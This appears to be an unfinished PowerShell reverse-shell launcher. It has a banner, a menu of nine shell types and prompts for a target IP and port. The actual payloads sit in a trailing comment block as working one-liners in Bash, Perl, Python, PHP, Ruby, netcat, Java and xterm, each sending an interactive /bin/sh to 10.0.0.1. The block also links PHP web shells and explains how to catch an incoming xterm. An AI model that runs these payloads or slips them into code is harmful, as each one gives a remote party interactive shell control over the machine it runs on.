Clear-Host

"Need a shell?
     _____                                         _____                                          
  __|___  |__  __   _  ______  ____    ____     __|___  |__  _____  ____    __  __  __  ____   _  
 |   ___|    ||  |_| ||   ___||    |  |    |   |   ___|    ||     ||    \  |  \/  \|  ||    \ | | 
    `-.`-.     ||   _  ||   ___||    |_ |    |_     `-.`-.     ||    _||     \ |     /\   ||     \| | 
 |______|  __||__| |_||______||______||______| |______|  __||___|  |__|\__\|____/  \__||__/\____| 
    |_____|                                       |_____|                                         
                                                                                                  
                                                                           "

"
1)  Bash Reverse Shell
2)  Perl Reverse Shell
3)  Python Reverse Shell
4)  PHP Findsock Shell
5)  PHP Reverse Shell
6)  Ruby Reverse Shell
7)  Netcat Reverse Shell
8)  Java Reverse Shell
9)  xterm Reverse Shell

"
$selection = Read-Host "Pick your shell:  "

switch ($selection) 
    {
        1 {"Bash Reverse Shell code goes here"}
        2 {"Perl Reverse Shell code goes here"}
        3 {"Python Reverse Shell code goes here"}
        4 {"PHP Findsock Shell code goes here"}
        5 {"PHP Reverse Shell code goes here"}
        6 {"Ruby Reverse Shell code goes here"}
        7 {"Netcat Reverse Shell code goes here"}
        8 {"Java Reverse Shell code goes here"}
        9 {"xterm Reverse Shell code goes here"}
        0 {"Trying to get any and all shells..."}  
        default {"That's not on the menu."}  

    }

$targetIP = Read-Host "Set target IP:  "
[bool]($targetIP -as [ipaddress])

$targetPort = Read-Host "Set target port (or leave blank to scan):  "
$targetPort -in 0..65535

# for selection of 0, run all

<#  
    BASH
    ----
    TO-DO: use bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    PERL
    ----
    TO-DO: use perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        
    PYTHON
    ------
    TO-DO: use python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    PHP
    ---
    TO-DO: use php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
    TO-DO: use http://pentestmonkey.net/tools/web-shells/php-findsock-shell
    TO-DO: use http://pentestmonkey.net/tools/web-shells/php-reverse-shell

    RUBY
    ----
    TO-DO: use ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    NETCAT
    ------
    TO-DO: use nc -e /bin/sh 10.0.0.1 1234
    OR
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

    JAVA
    ----
    TO-DO: use 
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

    XTERM
    -----
    TO-DO: use xterm -display 10.0.0.1:1
    To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):  Xnest :1
    You’ll need to authorise the target to connect to you (command also run on your host):  xhost +targetip 

#>
